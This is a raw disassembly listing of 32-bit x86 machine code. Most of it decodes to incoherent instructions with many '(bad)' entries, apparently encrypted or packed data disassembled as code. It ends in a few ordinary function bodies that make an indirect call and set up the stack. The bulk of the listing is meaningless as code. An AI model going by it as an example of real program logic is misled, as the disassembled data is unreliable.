  4161a9:	rcl    esi,cl
  4161ab:	jne    0x41617d
  4161ad:	(bad)  
  4161ae:	jg     0x4161a4
  4161b0:	jle    0x41614f
  4161b2:	in     al,0xb0
  4161b4:	je     0x41613f
  4161b6:	cwde   
  4161b7:	cmp    ch,BYTE PTR [edi+0x28]
  4161ba:	or     BYTE PTR [ebx],cl
  4161bc:	lds    edx,FWORD PTR [ebx]
  4161be:	test   eax,0x2e642d77
  4161c3:	loope  0x41617e
  4161c5:	mov    bh,0x81
  4161c7:	adc    ebp,DWORD PTR [si-0x5c]
  4161cb:	jge    0x4161a3
  4161cd:	leave  
  4161ce:	inc    eax
  4161cf:	mov    ah,0xe4
  4161d1:	daa    
  4161d2:	addr16 inc ebp
  4161d4:	leave  
  4161d5:	imul   esi,DWORD PTR [esi+0x19],0xb6a633fd
  4161dc:	jns    0x4161fd
  4161de:	pop    edx
  4161df:	(bad)  
  4161e0:	adc    BYTE PTR [edx*2+0x4df91e10],ch
  4161e7:	sub    al,0xce
  4161e9:	rcr    DWORD PTR [ebp-0x5],1
  4161ec:	cli    
  4161ed:	jb     0x41618d
  4161ef:	add    al,0x68
  4161f1:	clc    
  4161f2:	push   esp
  4161f3:	loop   0x4161a5
  4161f5:	and    eax,0x7f5ec6c1
  4161fa:	test   BYTE PTR [esi-0x1f819ea2],bl
  416200:	fmul   DWORD PTR [ebx]
  416202:	push   eax
  416203:	add    al,0xe8
  416205:	inc    edx
  416206:	xchg   edx,eax
  416207:	cmc    
  416208:	sub    eax,0x9029bb0c
  41620d:	xor    eax,eax
  41620f:	xchg   DWORD PTR [edx+0x33d651d7],esp
  416215:	pusha  
  416216:	int3   
  416217:	jge    0x416207
  416219:	inc    esp
  41621a:	or     ebx,DWORD PTR [ebx]
  41621c:	adc    al,0x5c
  41621e:	hlt    
  41621f:	push   esp
  416220:	xor    dl,BYTE PTR [ebx+0x1a]
  416223:	push   ecx
  416224:	(bad)
  416227:	adc    BYTE PTR [eax-0x4be8425f],bh
  41622d:	mov    eax,ds:0xe7393cf7
  416232:	sbb    eax,0x4537bea2
  416237:	xor    BYTE PTR [esi+0x6a],cl
  41623a:	dec    eax
  41623b:	jae    0x4161c2
  41623d:	xchg   esp,eax
  41623e:	mov    ah,0x3e
  416240:	not    DWORD PTR [esi-0x2]
  416243:	xchg   ecx,eax
  416244:	or     dh,BYTE PTR [edi+0x516c3b77]
  41624a:	popa   
  41624b:	sbb    DWORD PTR [esi-0xaec220],esi
  416251:	repz fs retf 0xb783
  416256:	mov    edi,DWORD PTR [ebx-0x18]
  416259:	add    DWORD PTR [edx+0xdaf3ce3],edi
  41625f:	adc    eax,DWORD PTR [ebx+edx*1-0x41]
  416263:	adc    bl,BYTE PTR [edi-0x5e03a81b]
  416269:	mov    bh,0x1c
  41626b:	nop
  41626c:	inc    edi
  41626d:	xchg   ebx,eax
  41626e:	repz mov ds:0xd18cfd79,al
  416274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416275:	pop    esp
  416276:	cmp    BYTE PTR [edi-0x5a67c403],0x21
  41627d:	mov    bl,0x60
  41627f:	inc    ebp
  416280:	push   0x55
  416282:	mov    edi,DWORD PTR [eax]
  416284:	fild   WORD PTR [edx+0x833c62d]
  41628a:	out    dx,eax
  41628b:	arpl   sp,ax
  41628d:	std    
  41628e:	loope  0x416247
  416290:	lods   al,BYTE PTR es:[esi]
  416292:	(bad)  
  416293:	push   edx
  416294:	mov    ecx,0xab38ca8d
  416299:	push   0xa755480
  41629e:	mov    cl,ch
  4162a0:	mov    ebp,0x4fb221c8
  4162a5:	jnp    0x416293
  4162a7:	gs jge 0x416326
  4162aa:	and    al,ch
  4162ac:	push   edi
  4162ad:	add    ebp,edx
  4162af:	scas   eax,DWORD PTR es:[edi]
  4162b0:	push   ebp
  4162b1:	inc    esp
  4162b2:	jbe    0x4162a3
  4162b4:	in     eax,0xed
  4162b6:	in     al,0xfe
  4162b8:	sti    
  4162b9:	pusha  
  4162ba:	(bad)  
  4162bb:	jno    0x416287
  4162bd:	popf   
  4162be:	add    DWORD PTR [edi+0x53],0x91b38802
  4162c5:	icebp  
  4162c6:	sbb    eax,0x787902c3
  4162cb:	out    0x3b,eax
  4162cd:	sar    ch,1
  4162cf:	or     DWORD PTR [ebx],ecx
  4162d1:	popa   
  4162d2:	xchg   DWORD PTR [ecx],esi
  4162d4:	xchg   edx,eax
  4162d5:	aad    0x1d
  4162d7:	mov    dl,0xe3
  4162d9:	in     al,0x81
  4162db:	push   0xffffffce
  4162dd:	inc    edi
  4162de:	aad    0x45
  4162e0:	mov    ds:0x8787e96b,eax
  4162e5:	jbe    0x4162e6
  4162e7:	fucom  st(6)
  4162e9:	xchg   ebp,eax
  4162ea:	lahf   
  4162eb:	pop    ebx
  4162ec:	mov    ds:0x94f9b598,eax
  4162f1:	xlat   BYTE PTR ds:[ebx]
  4162f2:	fiadd  WORD PTR [ecx-0x3f]
  4162f5:	sahf   
  4162f6:	and    ebp,DWORD PTR [edx+0x4ea351fb]
  4162fc:	xchg   edx,eax
  4162fd:	mov    eax,ds:0x7acdf534
  416302:	fcmovbe st,st(4)
  416304:	mov    dh,0x8
  416306:	into   
  416307:	push   cs
  416308:	(bad)  
  416309:	xchg   esi,eax
  41630a:	popf   
  41630b:	dec    ebp
  41630c:	sbb    BYTE PTR [ebp+0x11e8601d],cl
  416312:	mul    edx
  416314:	pop    ebp
  416315:	xchg   DWORD PTR [edx],ebp
  416317:	inc    ebp
  416318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416319:	mov    ecx,0xb0b52f9b
  41631e:	mov    ecx,DWORD PTR [esi-0x55]
  416321:	xchg   esp,eax
  416322:	imul   ebp,DWORD PTR [esi],0x3e
  416325:	mov    edi,eax
  416327:	scas   al,BYTE PTR es:[edi]
  416328:	inc    ebx
  416329:	enter  0xb430,0xa8
  41632d:	mov    ah,0xa8
  41632f:	sub    BYTE PTR [esi+0x44661ef0],ah
  416335:	jmp    0x416318
  416337:	mov    cl,0x15
  416339:	sub    eax,0x1e206362
  41633e:	lea    eax,[esi]
  416340:	(bad)  
  416342:	jle    0x416303
  416344:	(bad)  
  416345:	ins    BYTE PTR es:[edi],dx
  416346:	sti    
  416347:	dec    ecx
  416348:	test   DWORD PTR [esi+edi*1-0x7678aa5a],edi
  41634f:	std    
  416350:	inc    ebp
  416351:	push   es
  416352:	iret   
  416353:	repnz frstor [ebp-0x5f]
  416357:	jne    0x416357
  416359:	jo     0x41637d
  41635b:	jl     0x416355
  41635d:	xor    BYTE PTR [edx-0x4c],dl
  416360:	ins    BYTE PTR es:[edi],dx
  416361:	xlat   BYTE PTR ds:[ebx]
  416362:	jmp    0x9c83:0xf372ebe1
  416369:	or     al,0xac
  41636b:	lahf   
  41636c:	imul   DWORD PTR [ecx+eiz*2-0x1f365707]
  416373:	jp     0x4163b9
  416375:	sbb    ebp,ebp
  416377:	imul   si,WORD PTR [ebp-0x2cfb4547],0x5266
  416380:	stos   BYTE PTR es:[edi],al
  416381:	cdq    
  416382:	and    BYTE PTR [ebp-0x3b],bl
  416385:	jns    0x4163fe
  416387:	lahf   
  416388:	ss push ecx
  41638a:	lahf   
  41638b:	mov    dh,0x3f
  41638d:	inc    ebx
  41638e:	add    al,0x37
  416390:	add    edi,DWORD PTR [ecx]
  416392:	cs (bad) 
  416394:	scas   eax,DWORD PTR es:[edi]
  416395:	stc    
  416396:	(bad)
  416399:	push   ebx
  41639a:	add    eax,0x25dea1d8
  41639f:	adc    al,0x84
  4163a1:	push   eax
  4163a2:	xor    eax,0xa97e9e78
  4163a7:	xor    DWORD PTR [edx+0x5e],esi
  4163aa:	cdq    
  4163ab:	push   ds
  4163ac:	inc    ebx
  4163ad:	pushf  
  4163ae:	mov    dh,0x8c
  4163b0:	cmp    BYTE PTR [ebx+0x12],cl
  4163b3:	adc    al,0xff
  4163b5:	mov    eax,0x8bf61ade
  4163ba:	shl    DWORD PTR [ecx],0x58
  4163bd:	mov    al,ds:0xbc986b13
  4163c2:	call   0xce4c:0xc9230de1
  4163c9:	sbb    eax,0xd6f44d33
  4163ce:	mov    ecx,0x78d4017d
  4163d3:	mov    bl,0x5e
  4163d5:	fcomp  st(0)
  4163d7:	(bad)  
  4163d8:	mov    esp,DWORD PTR [edx-0x1a]
  4163db:	into   
  4163dc:	into   
  4163dd:	mov    bh,0x95
  4163df:	loope  0x4163aa
  4163e1:	cdq    
  4163e2:	clc    
  4163e3:	retf   
  4163e4:	dec    ebp
  4163e5:	inc    ebx
  4163e6:	cmp    BYTE PTR [edi],dl
  4163e8:	and    ebp,DWORD PTR [edi+eax*1+0x60e571d5]
  4163ef:	out    0xb1,al
  4163f1:	sub    al,0x70
  4163f3:	xor    BYTE PTR [esi],ah
  4163f5:	cs xchg ecx,eax
  4163f7:	push   ebx
  4163f8:	(bad)  
  4163f9:	fcos   
  4163fb:	shr    DWORD PTR [edi],1
  4163fd:	ss push esp
  4163ff:	sbb    BYTE PTR [eax+0x64c7e58d],bh
  416405:	int    0x87
  416407:	mov    eax,ds:0xdd77dbb7
  41640c:	push   cs
  41640d:	scas   al,BYTE PTR es:[edi]
  41640e:	pop    edx
  41640f:	push   es
  416410:	pop    es
  416411:	popf   
  416412:	loop   0x41642d
  416414:	not    DWORD PTR [ebx+0x40]
  416417:	cmp    ch,0xfb
  41641a:	cdq    
  41641b:	ins    DWORD PTR es:[edi],dx
  41641c:	rcl    DWORD PTR [ebp+0x45],1
  41641f:	sbb    eax,0x8c5830da
  416424:	sub    BYTE PTR [edi-0x56747835],0x45
  41642b:	into   
  41642c:	cmp    BYTE PTR [ebp+ecx*8+0x6b],al
  416430:	ja     0x41642d
  416432:	fistp  QWORD PTR [eax-0x3d]
  416435:	rol    BYTE PTR fs:[ecx-0x7327a9b4],0xfa
  41643d:	push   cs
  41643e:	add    bh,BYTE PTR [edi]
  416440:	bound  edx,QWORD PTR [esi-0x3639c149]
  416446:	mov    ah,0xff
  416448:	push   edx
  416449:	jmp    0xf1c01ea0
  41644e:	jbe    0x4163d1
  416450:	sahf   
  416451:	outs   dx,DWORD PTR ds:[esi]
  416452:	push   edx
  416453:	pusha  
  416454:	push   ds
  416455:	add    eax,0x7c4a7dfe
  41645a:	ds and eax,0x4e13aeb0
  416460:	ret    
  416461:	mov    edi,0x76468baa
  416467:	jmp    0xd539:0x3381d986
  41646e:	adc    DWORD PTR [edi],0x2be9798f
  416474:	das    
  416475:	pop    ebx
  416476:	sbb    DWORD PTR [esi+0x34],edx
  416479:	cmp    DWORD PTR [ebx-0x668cf73a],eax
  41647f:	adc    eax,0xb9588622
  416484:	sub    al,0xc6
  416486:	push   cs
  416487:	pusha  
  416488:	inc    edi
  416489:	leave  
  41648a:	mov    al,ds:0x82b8e5b9
  41648f:	not    BYTE PTR [eax]
  416491:	ret    
  416492:	out    dx,al
  416493:	les    esi,FWORD PTR [ecx]
  416495:	jl     0x4164e7
  416497:	std    
  416498:	xor    BYTE PTR [ecx+0x6a47f874],0x64
  41649f:	nop
  4164a0:	fsubr  DWORD PTR [edi+0x4]
  4164a3:	dec    esp
  4164a4:	mov    dh,0xba
  4164a6:	push   ebp
  4164a7:	nop
  4164a8:	aas    
  4164a9:	in     al,0xcc
  4164ab:	in     eax,0xf9
  4164ad:	or     BYTE PTR [eax+0x2caca659],cl
  4164b3:	mov    DWORD PTR ds:0x146d082b,esi
  4164b9:	jmp    0xa9fa:0x3717399b
  4164c0:	inc    ebp
  4164c1:	xor    BYTE PTR [ecx-0x34dec28a],0xd7
  4164c8:	cmp    dl,BYTE PTR [ebp-0x670d81f]
  4164ce:	add    eax,0xa20bcb12
  4164d3:	out    0xbd,al
  4164d5:	fiadd  WORD PTR [ebx]
  4164d7:	jmp    0x776d6691
  4164dc:	js     0x416544
  4164de:	add    dl,ah
  4164e0:	sub    DWORD PTR ds:0xd8b67db7,edi
  4164e6:	mov    edi,0x16da72ef
  4164eb:	shr    dh,1
  4164ed:	xchg   ecx,eax
  4164ee:	sbb    al,BYTE PTR [ebp+0x51]
  4164f1:	call   0x28819908
  4164f6:	std    
  4164f7:	daa    
  4164f8:	and    ebp,DWORD PTR [edi+edx*4]
  4164fb:	cli    
  4164fc:	xchg   edi,eax
  4164fd:	mov    BYTE PTR [eax+0x11],dl
  416500:	scas   eax,DWORD PTR es:[edi]
  416501:	add    BYTE PTR [edx+edx*2-0x3ee8c77b],cl
  416508:	mov    DWORD PTR [esi-0xbed891b],eax
  41650e:	jns    0x416581
  416510:	mov    edi,DWORD PTR [edx+0x6b]
  416513:	and    edi,DWORD PTR [esi+0xfbb335e]
  416519:	mov    ds:0x30e531c2,al
  41651e:	ffreep st(6)
  416520:	repz dec esi
  416522:	jo     0x41655f
  416524:	ret    
  416525:	ret    0xd8e5
  416528:	add    al,0xa1
  41652a:	mov    dh,0xa8
  41652c:	mov    eax,0x6a95ca3
  416531:	mov    ch,0x6e
  416533:	or     al,0xb4
  416535:	adc    eax,0xc619241e
  41653a:	and    edx,DWORD PTR [eax-0x60e1ca47]
  416540:	push   edi
  416541:	jne    0x4165be
  416543:	div    BYTE PTR [edx+0x46]
  416546:	push   ss
  416547:	scas   al,BYTE PTR es:[edi]
  416548:	sub    ebp,DWORD PTR [eax]
  41654a:	jne    0x416585
  41654c:	dec    eax
  41654d:	ins    DWORD PTR es:[edi],dx
  41654e:	jno    0x416501
  416550:	and    al,0xcb
  416552:	mov    esi,0xa4b3ac29
  416557:	out    0x35,eax
  416559:	fwait
  41655a:	add    eax,0x8a357f9f
  41655f:	add    edi,DWORD PTR [eax]
  416561:	ds mov bl,0xad
  416564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416565:	pop    esp
  416566:	mov    ebp,0xb5746fa4
  41656b:	xchg   edx,eax
  41656c:	mov    esi,0xd3c7b0e9
  416571:	inc    ebp
  416572:	xchg   ebx,eax
  416573:	loopne 0x416507
  416575:	ret    0x136e
  416578:	cli    
  416579:	push   ebx
  41657a:	inc    ecx
  41657b:	mov    ecx,0x2f5c7544
  416580:	sub    eax,0xf87f3db7
  416585:	dec    ebp
  416586:	loop   0x4165c0
  416588:	rol    DWORD PTR [edi-0x458c7e25],1
  41658e:	inc    edi
  41658f:	pop    ss
  416590:	mov    ebp,0x12d118e7
  416595:	out    0x54,al
  416597:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416598:	popf   
  416599:	dec    esp
  41659a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41659b:	(bad)  
  41659c:	mov    ah,0xeb
  41659e:	add    al,0xcd
  4165a0:	jnp    0x4165e5
  4165a2:	iret   
  4165a3:	mov    eax,0xfc162c39
  4165a8:	daa    
  4165a9:	lock jae 0x4165b2
  4165ac:	mov    ecx,0xa8e93829
  4165b1:	lods   al,BYTE PTR ds:[esi]
  4165b2:	dec    ecx
  4165b3:	ins    BYTE PTR es:[edi],dx
  4165b4:	cmp    ch,BYTE PTR [ebx+edx*1-0x29b5bd4c]
  4165bb:	mov    ds:0x5dd52923,eax
  4165c0:	(bad)  
  4165c1:	fwait
  4165c2:	pop    ebp
  4165c3:	jb     0x4165f9
  4165c5:	mov    edi,0xe26a69d3
  4165ca:	add    DWORD PTR [esi],ebx
  4165cc:	mov    eax,0x34d3fad8
  4165d1:	or     al,0xab
  4165d3:	inc    ecx
  4165d4:	sar    DWORD PTR [edi+ecx*8-0x56935fd5],0xd
  4165dc:	stos   BYTE PTR es:[edi],al
  4165dd:	sbb    DWORD PTR [esi-0x66a90c67],eax
  4165e3:	(bad)  
  4165e4:	je     0x41656f
  4165e6:	daa    
  4165e7:	cld    
  4165e8:	mov    ch,0x3c
  4165ea:	pop    ebp
  4165eb:	ror    BYTE PTR [esi-0x1e058853],cl
  4165f1:	xchg   ebp,eax
  4165f2:	mov    DWORD PTR [ecx],esi
  4165f4:	pop    ecx
  4165f5:	jecxz  0x41660b
  4165f7:	popa   
  4165f8:	or     eax,0x39ba222b
  4165fd:	ins    BYTE PTR es:[edi],dx
  4165fe:	lahf   
  4165ff:	in     eax,0xe9
  416601:	sbb    DWORD PTR ss:[ebp-0x5e],ebx
  416605:	ret    
  416606:	sbb    eax,0xc215f868
  41660b:	outs   dx,DWORD PTR ds:[esi]
  41660c:	cs xor eax,0xa52e5ca4
  416612:	jno    0x4165a9
  416614:	ror    DWORD PTR [edi+0x26],cl
  416617:	inc    ebx
  416618:	xor    ebx,DWORD PTR [edx+0x27d82cb6]
  41661e:	ds in  eax,dx
  416620:	sbb    ecx,DWORD PTR [ecx]
  416622:	sbb    al,0x20
  416624:	jb     0x4165bc
  416626:	xor    eax,DWORD PTR [ebx+0x77]
  416629:	(bad)  
  41662a:	out    dx,eax
  41662b:	int    0x10
  41662d:	xor    BYTE PTR [eax+eiz*1-0x7f47a6be],al
  416634:	mov    dh,0x4d
  416636:	xchg   ebx,eax
  416637:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416638:	enter  0xf074,0x26
  41663c:	inc    ebp
  41663d:	sub    eax,0x7b3924ed
  416642:	arpl   si,di
  416644:	or     DWORD PTR [ebp-0x25f4fbac],0x64
  41664b:	std    
  41664c:	sub    BYTE PTR [ecx+esi*2+0x36],dl
  416650:	and    ebp,DWORD PTR [ebp+0x73]
  416653:	ret    
  416654:	mov    bl,0x31
  416656:	aas    
  416657:	(bad)  
  416658:	fidivr WORD PTR [ecx]
  41665a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41665b:	or     eax,0xb847f85
  416660:	jle    0x416687
  416662:	mov    bh,0xc1
  416664:	fwait
  416665:	xchg   ebx,eax
  416666:	and    DWORD PTR [eax],0xffffffe4
  416669:	(bad)  
  41666a:	mov    al,0x77
  41666c:	scas   eax,DWORD PTR es:[edi]
  41666d:	cld    
  41666e:	out    0x27,al
  416670:	xor    bh,BYTE PTR [ebp+0x6ca7f861]
  416676:	cmp    eax,0x42c18e38
  41667b:	and    DWORD PTR [ecx],ebp
  41667d:	scas   al,BYTE PTR es:[edi]
  41667e:	test   cl,al
  416680:	fwait
  416681:	inc    edi
  416682:	in     eax,0xf2
  416684:	cdq    
  416685:	inc    esp
  416686:	sub    al,ah
  416688:	fnstenv [ebx*1-0x7ec0ab72]
  41668f:	mov    edi,0x57e213ae
  416694:	repz push edi
  416696:	adc    BYTE PTR [edi+0x66],0x72
  41669a:	lods   al,BYTE PTR ds:[esi]
  41669b:	jp     0x4166bf
  41669d:	sub    DWORD PTR [eax],0x7622b8fa
  4166a3:	or     ch,bl
  4166a5:	into   
  4166a6:	mov    ds:0x3b7d45af,eax
  4166ab:	or     DWORD PTR [edx-0x80],ebp
  4166ae:	sbb    al,0xc4
  4166b0:	clc    
  4166b1:	stos   BYTE PTR es:[edi],al
  4166b2:	mov    dh,0xc1
  4166b4:	mov    al,ds:0xcbad828c
  4166b9:	dec    edx
  4166ba:	mov    ecx,0xa5a06e58
  4166bf:	and    al,0x94
  4166c1:	addr16 cwde 
  4166c3:	in     al,dx
  4166c4:	inc    esi
  4166c5:	icebp  
  4166c6:	jns    0x416658
  4166c8:	icebp  
  4166c9:	mov    ch,0x80
  4166cb:	mov    esp,0xc7aa2752
  4166d0:	adc    eax,0x71343ac6
  4166d5:	shl    DWORD PTR [edx-0x71f0ac41],0x7c
  4166dc:	adc    ecx,DWORD PTR [edi-0x24]
  4166df:	in     eax,dx
  4166e0:	pop    ebp
  4166e1:	xchg   ecx,eax
  4166e2:	xor    eax,0x8d1e1298
  4166e7:	jbe    0x416735
  4166e9:	fnstcw WORD PTR [ebp+0x6d8ff948]
  4166ef:	xchg   edi,eax
  4166f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f1:	scas   al,BYTE PTR es:[edi]
  4166f2:	cmp    ah,dh
  4166f4:	cmp    al,0x2e
  4166f6:	inc    esp
  4166f7:	je     0x4166e2
  4166f9:	dec    ebx
  4166fa:	jg     0x41669b
  4166fc:	scas   al,BYTE PTR es:[edi]
  4166fd:	pop    ebx
  4166fe:	fcmovne st,st(6)
  416700:	ins    BYTE PTR es:[edi],dx
  416701:	call   0x29b0:0xe6470c25
  416708:	adc    eax,0x294d1237
  41670d:	gs mov ebp,0x98359610
  416713:	jb     0x416787
  416715:	and    DWORD PTR [ebx-0x57],esi
  416718:	rcl    DWORD PTR [ebx+ebx*4-0x572d4815],0x94
  416720:	pop    ss
  416721:	mov    esp,0xb611f682
  416726:	push   ebp
  416727:	mov    ecx,DWORD PTR gs:[esp+ecx*8-0x71]
  41672c:	inc    si
  41672e:	out    0xb1,eax
  416730:	leave  
  416731:	push   edx
  416732:	call   0x8ca4:0x5a063dc9
  416739:	(bad)  
  41673b:	es aaa 
  41673d:	bnd call 0xed6587a5
  416743:	retf   
  416744:	jnp    0x416778
  416746:	(bad)  
  416747:	jae    0x416770
  416749:	xchg   ebx,eax
  41674a:	and    DWORD PTR [ecx+0x13a4d25b],0xe333d9f2
  416754:	jle    0x41670f
  416756:	lods   al,BYTE PTR ds:[esi]
  416757:	xchg   ecx,eax
  416758:	sbb    DWORD PTR [ebx-0x7a],ebp
  41675b:	add    BYTE PTR gs:[eax-0x7b],bl
  41675f:	repz inc edi
  416761:	mov    fs,WORD PTR ds:0x2c9b4412
  416767:	out    0xe3,eax
  416769:	pop    ecx
  41676a:	xor    eax,0xc7ab0552
  41676f:	sub    al,0x6a
  416771:	push   cs
  416772:	(bad)  
  416773:	xor    BYTE PTR [edx+0x52],al
  416776:	cmp    al,dl
  416778:	dec    esi
  416779:	stos   DWORD PTR es:[edi],eax
  41677a:	aam    0x79
  41677c:	ins    BYTE PTR es:[edi],dx
  41677d:	inc    ebp
  41677e:	xor    eax,0x3f50c556
  416783:	inc    ebp
  416784:	cmp    eax,0xc40e0b96
  416789:	fistp  WORD PTR [eax-0x35]
  41678c:	(bad)  
  41678d:	and    esp,DWORD PTR [esi-0x5f]
  416790:	inc    edi
  416791:	fs retf 0x91a6
  416795:	and    eax,0x8ae821b9
  41679a:	mov    ch,0xd1
  41679c:	mov    edx,0x43ee6c6e
  4167a1:	cdq    
  4167a2:	push   ds
  4167a3:	sahf   
  4167a4:	pushf  
  4167a5:	jecxz  0x416727
  4167a7:	dec    edi
  4167a8:	xchg   ebx,eax
  4167a9:	and    DWORD PTR [eax-0x68],eax
  4167ac:	imul   edi,ecx,0x95bc1e3f
  4167b2:	retf   
  4167b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167b4:	add    ah,cl
  4167b6:	mov    esi,DWORD PTR [ebp+0x67]
  4167b9:	mov    ds:0xdb029fc3,eax
  4167be:	cld    
  4167bf:	add    eax,0xc1b8c96b
  4167c4:	inc    edx
  4167c5:	xor    BYTE PTR [esi+0x6ac7da7b],0x9b
  4167cc:	pushf  
  4167cd:	sti    
  4167ce:	data16 mov cl,0x5c
  4167d1:	sbb    eax,0x4bd11772
  4167d6:	or     eax,0x6d155d9
  4167db:	mov    edi,DWORD PTR [ebp+0x1a]
  4167de:	shl    ebp,0x15
  4167e1:	mov    DWORD PTR [ebp+0xc],eax
  4167e4:	fbld   TBYTE PTR [edi+0x52441745]
  4167ea:	jp     0x4167ac
  4167ec:	das    
  4167ed:	add    eax,0xaeed1c80
  4167f2:	mov    eax,0x1246f64c
  4167f7:	xlat   BYTE PTR ds:[ebx]
  4167f8:	sub    DWORD PTR [eax],esi
  4167fa:	xchg   ecx,eax
  4167fb:	adc    BYTE PTR [edx],al
  4167fd:	sbb    ch,ch
  4167ff:	call   0x4581b47c
  416804:	rol    BYTE PTR [esi],1
  416806:	xor    ebx,edx
  416808:	dec    esi
  416809:	pusha  
  41680a:	dec    esi
  41680b:	mov    ch,0xd7
  41680d:	adc    BYTE PTR [esi],bh
  41680f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416810:	out    0xb7,al
  416812:	leave  
  416813:	xchg   edx,eax
  416814:	jmp    0xff5743bf
  416819:	xor    BYTE PTR ds:[esi+0x6a6dc1e3],dh
  416820:	das    
  416821:	(bad)  
  416822:	and    DWORD PTR [ebp+0xaa5bf91],eax
  416828:	lea    edi,[ecx]
  41682a:	mov    dl,0x23
  41682c:	(bad)  
  41682d:	lock mov ?,WORD PTR [eax+0x2a030d89]
  416834:	jbe    0x4167d3
  416836:	inc    esp
  416837:	aas    
  416838:	and    eax,0x299e34a6
  41683d:	xor    DWORD PTR [eax-0xa],edx
  416840:	into   
  416841:	dec    esp
  416842:	lock dec ebp
  416844:	cmp    BYTE PTR [ebp+0x4c5e1bc4],al
  41684a:	repz ficom DWORD PTR [esp+ebx*2-0x6441c59f]
  416852:	ss cmp eax,0xdb1045cd
  416858:	out    dx,eax
  416859:	adc    DWORD PTR [ebp-0x67],eax
  41685c:	nop
  41685d:	dec    eax
  41685e:	add    BYTE PTR [edi],0x28
  416861:	daa    
  416862:	fwait
  416863:	retf   
  416864:	and    eax,0x8c6b0c39
  416869:	add    dh,dh
  41686b:	ins    BYTE PTR es:[edi],dx
  41686c:	ret    
  41686d:	pushf  
  41686e:	cmp    eax,DWORD PTR [ebx]
  416870:	add    eax,0xd9086a35
  416875:	add    eax,0x816f0940
  41687a:	inc    esp
  41687b:	or     BYTE PTR [ebp-0x744c7304],al
  416881:	mov    ebx,DWORD PTR [esi]
  416883:	jge    0x416877
  416885:	jno    0x416876
  416887:	xor    esi,edx
  416889:	push   es
  41688a:	fst    QWORD PTR [ebx-0xe]
  41688d:	(bad)  
  41688e:	rcr    BYTE PTR [eax+edx*4-0x21],1
  416892:	mov    ebx,0x24fdde58
  416897:	jns    0xa131b059
  41689d:	jle    0x4168a2
  41689f:	xchg   esp,eax
  4168a0:	rol    cl,1
  4168a2:	adc    ah,BYTE PTR [ecx-0x4b64146b]
  4168a8:	ret    
  4168a9:	addr16 aaa 
  4168ab:	push   edi
  4168ac:	call   0x909e27b2
  4168b1:	xchg   esp,eax
  4168b2:	or     DWORD PTR [eax-0x155fc7f4],eax
  4168b8:	loope  0x416906
  4168ba:	ror    BYTE PTR [eax+0x47fc79dc],0xa3
  4168c1:	in     eax,dx
  4168c2:	ins    DWORD PTR es:[edi],dx
  4168c3:	push   0xa011c182
  4168c8:	jmp    0x4168a3
  4168ca:	xchg   esi,eax
  4168cb:	mov    ds:0xeab02565,al
  4168d0:	neg    ebp
  4168d2:	fs cli 
  4168d4:	aam    0xaf
  4168d6:	jbe    0x416937
  4168d8:	sub    ebx,ecx
  4168da:	dec    eax
  4168db:	sti    
  4168dc:	mov    ebx,0x9b29b213
  4168e1:	mov    ecx,0x37377276
  4168e6:	test   BYTE PTR ds:0x39c82b82,0x3d
  4168ed:	mov    bh,0x13
  4168ef:	sbb    ch,BYTE PTR [ecx+ecx*4+0x68]
  4168f3:	test   DWORD PTR [ebx-0x11],ebp
  4168f6:	or     ch,BYTE PTR [edi-0x40c1880f]
  4168fc:	scas   eax,DWORD PTR es:[edi]
  4168fd:	mov    BYTE PTR [edi],dl
  4168ff:	stc    
  416900:	inc    edx
  416901:	inc    esp
  416902:	test   al,0x3f
  416904:	sar    DWORD PTR [esi+0x2f],1
  416907:	inc    ecx
  416908:	sbb    eax,0xd7c530a0
  41690d:	xor    DWORD PTR [esp+edi*2+0x5b],eax
  416911:	fidiv  WORD PTR [esi]
  416913:	ror    edi,1
  416915:	les    ebx,FWORD PTR [edx+0x35c9f4d9]
  41691b:	mov    dl,0x1b
  41691d:	ror    BYTE PTR [esi-0x76],cl
  416920:	lds    edx,FWORD PTR [eax+0x7db49ff3]
  416926:	shl    BYTE PTR [ebx+0x6395dbe0],1
  41692c:	dec    edx
  41692d:	(bad)  
  41692e:	out    dx,eax
  41692f:	es loop 0x416984
  416932:	call   0x5abf5cf
  416937:	jo     0x4168bd
  416939:	inc    ecx
  41693a:	push   ebx
  41693b:	in     al,dx
  41693c:	add    edi,DWORD PTR [ecx]
  41693e:	mov    esi,DWORD PTR [ebp-0x4]
  416941:	call   esi
  416943:	mov    DWORD PTR [ebp-0x38],eax
  416946:	cmp    DWORD PTR [ebp-0x38],0x57
  41694a:	jne    0x416958
  41694c:	mov    edx,DWORD PTR [ebp-0x20]
  41694f:	push   edx
  416950:	call   0x401000
  416955:	add    esp,0x4
  416958:	xor    eax,eax
  41695a:	pop    esi
  41695b:	mov    esp,ebp
  41695d:	pop    ebp
  41695e:	ret    
  41695f:	push   ebp
  416960:	mov    ebp,esp
  416962:	sub    esp,0x124
  416968:	xor    eax,eax
  41696a:	mov    esp,ebp
  41696c:	pop    ebp
  41696d:	ret    
  41696e:	push   ebp
  41696f:	mov    ebp,esp
  416971:	sub    esp,0x2c
  416974:	push   ebx
  416975:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  41697c:	mov    DWORD PTR [ebp-0xc],0x0
  416983:	mov    DWORD PTR [ebp-0x20],0x1
  41698a:	mov    DWORD PTR [ebp-0x10],0x0
  416991:	mov    eax,DWORD PTR [ebp+0xc]
  416994:	mov    DWORD PTR [ebp-0x1c],eax
  416997:	mov    DWORD PTR [ebp-0x18],0x0
  41699e:	mov    DWORD PTR [ebp-0x8],0x0
  4169a5:	mov    DWORD PTR [ebp-0x24],0x0
  4169ac:	mov    ecx,DWORD PTR [ebp-0x4]
  4169af:	sub    ecx,0x1
  4169b2:	mov    DWORD PTR [ebp-0x4],ecx
  4169b5:	mov    edx,DWORD PTR [ebp+0x8]
  4169b8:	mov    DWORD PTR [ebp-0x10],edx
  4169bb:	mov    DWORD PTR [ebp-0x28],0x1
  4169c2:	mov    eax,DWORD PTR [ebp-0x4]
  4169c5:	add    eax,0x2
  4169c8:	mov    DWORD PTR [ebp-0x4],eax
  4169cb:	mov    ecx,DWORD PTR [ebp-0x1c]
